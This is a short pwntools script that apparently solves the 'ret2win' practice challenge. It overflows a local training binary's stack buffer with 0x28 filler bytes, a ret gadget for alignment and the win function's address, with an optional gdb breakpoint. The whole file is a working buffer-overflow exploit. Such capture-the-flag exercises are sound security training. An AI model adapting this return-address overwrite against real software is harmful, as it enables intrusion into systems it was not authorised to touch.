#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win')

target = elf.symbols["ret2win"]

gs='''
b *pwnme+107
c
'''

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

time.sleep(.5)


io.recvuntil(b"> ")

# for stack alignement in case of movabs usage
ropnop=0x400770

PL=0x28*b"A"+p64(ropnop)+p64(target)
io.sendline(PL)
io.interactive()
